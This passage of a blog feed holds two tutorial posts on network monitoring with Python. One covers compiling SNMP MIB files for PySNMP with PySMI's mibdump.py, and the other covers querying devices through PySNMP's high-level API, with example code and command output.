agent.</summary></entry><entry><title type="html">Compiling SNMP MIB’s for PySNMP</title><link href="http://localhost:4000/2022/01/14/compiling-mibs-for-pysnmp.html" rel="alternate" type="text/html" title="Compiling SNMP MIB’s for PySNMP" /><published>2022-01-14T00:00:00-07:00</published><updated>2022-01-17T21:13:00-07:00</updated><id>http://localhost:4000/2022/01/14/compiling-mibs-for-pysnmp</id><content type="html" xml:base="http://localhost:4000/2022/01/14/compiling-mibs-for-pysnmp.html">&lt;p&gt;The ability to refer to a SNMP MIB variable by name is an important aspect for increasing readability and understanding of your Python scripts. &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/&quot;&gt;PySNMP&lt;/a&gt; comes with several common pre-compiled MIB’s in a format that its capable of using, but if you need to query a MIB variable it doesn’t ship with, you’re left refering to the variable as an SNMP OID. Having to remember what a particular OID is for, or creating a mapping table between a MIB variable name and its OID (such as a Python dictionary), can become tedious. Additionally, parsing a &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectType&quot;&gt;PySNMP ObjectType&lt;/a&gt; class instance that isn’t fully translated to the MIB variable name can make things more complicated.&lt;/p&gt;

&lt;p&gt;When you install PySNMP with PIP you also get &lt;a href=&quot;https://github.com/etingof/pysmi&quot;&gt;PySMI&lt;/a&gt; with it. PySMI was created by the same creator as PySNMP, and it allows you to compile other SNMP MIB’s for your projects. This article will cover how to compile additional MIB’s for your Python SNMP projects so that you can extend their capabilities!&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;Looking for an introduction to PySNMP? Check out my &lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;previous post&lt;/a&gt; to get familiar!&lt;/p&gt;

&lt;p class=&quot;notice--warning&quot;&gt;It should be pointed out that the PySNMP packages latest release of 4.4.12 was last released on Sept 24, 2019 as seen on &lt;a href=&quot;https://github.com/etingof/pysnmp&quot;&gt;Github&lt;/a&gt;. The &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/&quot;&gt;PySNMP&lt;/a&gt; site itself has a disclaimer right at the top that the documentation is an inofficial copy. Although it has not been updated in quite some time, it still appears to be effective for performing SNMP queries with Python.&lt;/p&gt;

&lt;h2 id=&quot;pysnmp-and-mibs&quot;&gt;PySNMP and MIB’s&lt;/h2&gt;

&lt;p&gt;PySNMP comes pre-compiled with a few common MIB’s for your use out-of-the-box. You can see which MIB’s are pre-compiled by checking out your Python installations site-packages folder under pysnmp/smi/mibs. That being said, PySNMP will look in the following locations for other complied MIB’s:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Your PySNMP’s installation folder under pysnmp/smi/mibs&lt;/li&gt;
  &lt;li&gt;In your home directory under .pysnmp/mibs&lt;/li&gt;
  &lt;li&gt;In any local directory or remote HTTP location that you specify when adding a plain-text MIB to your command generator (e.g. getCmd())&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;where-to-find-3rd-party-mib-files&quot;&gt;Where to Find 3rd Party MIB Files&lt;/h2&gt;

&lt;p&gt;Each platform vendor (e.g. Cisco, Arista, F5, etc) will often create SNMP MIB’s that customers can use for querying platform-specific features/statistics. Often times you can download these MIB files from a vendors website or directly from their product that you have installed in your environment.&lt;/p&gt;

&lt;p&gt;Using Cisco as an example, they have an &lt;a href=&quot;https://snmp.cloudapps.cisco.com/Support/SNMP/do/BrowseMIB.do?local=en&amp;amp;step=2&quot;&gt;SNMP object navigator&lt;/a&gt; (Cisco CCO login required) that allows you to browse their &lt;em&gt;extensive&lt;/em&gt; list of SNMP objects and MIB’s.&lt;/p&gt;

&lt;h2 id=&quot;using-plain-text-mibs&quot;&gt;Using Plain-Text MIB’s&lt;/h2&gt;

&lt;p&gt;To use a plain-text MIB with your command generator you can provide an ObjectIdentity and ObjectType class instance that looks like the following:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;IF-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ifInOctets&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addAsn1MibSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&apos;file://.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&apos;file:///usr/share/snmp&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this particular case we are creating a reference to the MIB variable ifInOctets in the IF-MIB SNMP MIB. By using &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectIdentity.addAsn1MibSource&quot;&gt;.addAsn1MibSource()&lt;/a&gt; we can provide multiple local or remote file locations for MIB files. In this particular case I have placed IF-MIB.my in the same directory that I’m running my script from (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file://.&lt;/code&gt;), and have an alternative path to search (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file:///usr/share/snmp&lt;/code&gt;), showing that its possible to refer to multiple locations. Additional locations can be remote HTTP sites to download the MIB from.&lt;/p&gt;

&lt;p&gt;An example of using this ObjectType with a command generator is as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;\
                         &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&apos;IF-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ifInOctets&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addAsn1MibSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;&apos;file://.&apos;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that our varBinds variable returns the number of Octets received on the interface with SNMP IF Index 1. The best part of this is that the MIB variable name is fully referenceable, instead of showing the OID:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;IF-MIB::ifInOctets.1 = 81424&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;compiling-a-mib-into-pysnmp-format&quot;&gt;Compiling a MIB into PySNMP format&lt;/h2&gt;

&lt;p&gt;Referencing a plain-text MIB file works perfect fine for simple operations. However, I can see doing this at scale not being effective for the reason that the plain-text file needs to be read frequently, and if you’re referring to a remote file location via HTTP this can add increased latency.&lt;/p&gt;

&lt;p&gt;PySMI (which comes installed as a dependency when you install PySNMP) gives you the ability to take a plain-text file and compile it directly into a format that PySNMP can use. By using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mibdump.py&lt;/code&gt; utility that is made available to you with PySMI, you can provide a few flags and it will generate a PySNMP MIB Python file. In this case we will use the IF-MIB as an example of compiling. Using &lt;a href=&quot;https://snmp.cloudapps.cisco.com/Support/SNMP/do/BrowseMIB.do?local=en&amp;amp;step=2&amp;amp;submitClicked=true&amp;amp;mibName=IF-MIB#dependencies&quot;&gt;Cisco’s SNMP Object Navigator&lt;/a&gt; search for and download the IF-MIB and open it in a text editor.&lt;/p&gt;

&lt;p&gt;At the top of the IF-MIB.my file you’ll see that there are a series of IMPORTS statements:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...

IMPORTS
    MODULE-IDENTITY, OBJECT-TYPE, Counter32, Gauge32, Counter64,
    Integer32, TimeTicks, mib-2,
    NOTIFICATION-TYPE                        FROM SNMPv2-SMI
    TEXTUAL-CONVENTION, DisplayString,
    PhysAddress, TruthValue, RowStatus,
    TimeStamp, AutonomousType, TestAndIncr   FROM SNMPv2-TC
    MODULE-COMPLIANCE, OBJECT-GROUP,
    NOTIFICATION-GROUP                       FROM SNMPv2-CONF
    snmpTraps                                FROM SNMPv2-MIB
    IANAifType                               FROM IANAifType-MIB;

...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These import statements refer to other MIB files that the IF-MIB relies on for declaring how to interpret the MIB file. In this particular case you will need to download all of the MIB files referenced after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FROM&lt;/code&gt; statements; SNMPv2-SMI, SNMPv2-TC, SNMPv2-CONF, SNMPv2-MIB, and IANAifType-MIB. Thankfully, these can be found at the same link I posted above.&lt;/p&gt;

&lt;p&gt;The reason these files are important is because PySMI will need to refer to these when compiling IF-MIB, so that it can build a complete PySNMP referencable MIB file.&lt;/p&gt;

&lt;p&gt;Once all of these files are downloaded and placed in a single folder, it’s time to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mibdump.py&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(venv) snmp-testing % mibdump.py --generate-mib-texts --destination-format pysnmp IF-MIB
Source MIB repositories: file:///usr/share/snmp/mibs, http://mibs.snmplabs.com/asn1/@mib@
Borrow missing/failed MIBs from: http://mibs.snmplabs.com/pysnmp/fulltexts/@mib@
Existing/compiled MIB locations: pysnmp.smi.mibs, pysnmp_mibs
Compiled MIBs destination directory: /Users/byaklin/.pysnmp/mibs
MIBs excluded from code generation: INET-ADDRESS-MIB, PYSNMP-USM-MIB, RFC-1212, RFC-1215, RFC1065-SMI, RFC1155-SMI, RFC1158-MIB, RFC1213-MIB, SNMP-FRAMEWORK-MIB, SNMP-TARGET-MIB, SNMPv2-CONF, SNMPv2-SMI, SNMPv2-TC, SNMPv2-TM, TRANSPORT-ADDRESS-MIB
MIBs to compile: IF-MIB
Destination format: pysnmp
Parser grammar cache directory: not used
Also compile all relevant MIBs: yes
Rebuild MIBs regardless of age: no
Dry run mode: no
Create/update MIBs: yes
Byte-compile Python modules: yes (optimization level no)
Ignore compilation errors: no
Generate OID-&amp;gt;MIB index: no
Generate texts in MIBs: yes
Keep original texts layout: no
Try various file names while searching for MIB module: yes
Created/updated MIBs:
Pre-compiled MIBs borrowed:
Up to date MIBs: IANAifType-MIB, IF-MIB, SNMPv2-CONF, SNMPv2-MIB, SNMPv2-SMI, SNMPv2-TC
Missing source MIBs:
Ignored MIBs:
Failed MIBs:
(venv) snmp-testing %
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that I provided a few flags:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--generated-mib-texts&lt;/code&gt; so that we create a MIB file&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--destination-format pysnmp&lt;/code&gt; so that the output file format is in PySNMP, but the other option is JSON&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IF-MIB&lt;/code&gt; is the name of the MIB we want to compile. This searches for the IF-MIB.my file in the directory that you’re running mibdump.py from&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;notice--info&quot;&gt;Note that you don’t need to provide all of the name of the dependency MIB files. PySMI and mibdump.py can interpret IF-MIB.my to learn about these and search for them in the same directory.&lt;/p&gt;

&lt;p&gt;The output when running mibdump.py shows that the compiled MIB will be placed in the directory /Users/byaklin/.pysnmp/mibs (which PySNMP can search by default), but you can optionally provide a directory with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--destination-directory&lt;/code&gt; flag when running mibdump.py.&lt;/p&gt;

&lt;p&gt;An alternative directory that you could store your compiled MIB file in would be that of where pysnmp is installed. In my case I’m using a Python virtual-environment, so the directory would be venv/lib/python3.9/site-packages/pysnmp/smi/mibs/&lt;/p&gt;

&lt;p&gt;Now when we go to supply this MIB variable to our SNMP command, we don’t need to reference an external source:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;IF-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ifInOctets&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Brian Yaklin</name></author><category term="Python" /><category term="Automation" /><category term="SNMP" /><summary type="html">The ability to refer to a SNMP MIB variable by name is an important aspect for increasing readability and understanding of your Python scripts. PySNMP comes with several common pre-compiled MIB’s in a format that its capable of using, but if you need to query a MIB variable it doesn’t ship with, you’re left refering to the variable as an SNMP OID. Having to remember what a particular OID is for, or creating a mapping table between a MIB variable name and its OID (such as a Python dictionary), can become tedious. Additionally, parsing a PySNMP ObjectType class instance that isn’t fully translated to the MIB variable name can make things more complicated.</summary></entry><entry><title type="html">SNMP Queries with PySNMP High-Level API</title><link href="http://localhost:4000/2022/01/11/pysnmp-hlapi-overview.html" rel="alternate" type="text/html" title="SNMP Queries with PySNMP High-Level API" /><published>2022-01-11T00:00:00-07:00</published><updated>2022-01-17T21:13:00-07:00</updated><id>http://localhost:4000/2022/01/11/pysnmp-hlapi-overview</id><content type="html" xml:base="http://localhost:4000/2022/01/11/pysnmp-hlapi-overview.html">&lt;p&gt;I’ve &lt;a href=&quot;/2021/08/25/snmp-queries-with-python.html&quot;&gt;previously written&lt;/a&gt; about &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/&quot;&gt;PySNMP’s&lt;/a&gt; simpler SNMP query using one-liner command generator as a method to send SNMP queries using an OID. That method allows you to avoid having to compile MIB’s that do not come as a default in the PySNMP library. In the next few posts I want to outline how to use PySNMP’s high-level API (hlapi) and how to complie any MIB’s that may be missing. This will help you use PySNMP in its intended fashion, and using the name of the OID which provides for better readability.&lt;/p&gt;

&lt;p&gt;Within this article I will explore PySNMP’s hlapi by breaking down it’s own &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/quick-start.html&quot;&gt;quick start ‘fetch SNMP variable&lt;/a&gt; example. The hlapi was designed to be an easy to use API for as close to a ‘one-liner’ SNMP query as you can get. The examples in this guide will focus on the synchronous implementation (performing one SNMP task at a time), but there is the capability to implement PySNMP asynchronously if you are looking for increased speed and scalability.&lt;/p&gt;

&lt;h2 id=&quot;getting-started---a-simple-snmp-query&quot;&gt;Getting Started - A Simple SNMP Query&lt;/h2&gt;

&lt;p&gt;We will start with a simple SNMP query using the method described in PySNMP’s Quick Start linked above. In this particular example I am sending an SNMP GET to a Cisco IOSv router for sysName.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;\
                         &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysName&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{} at {}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
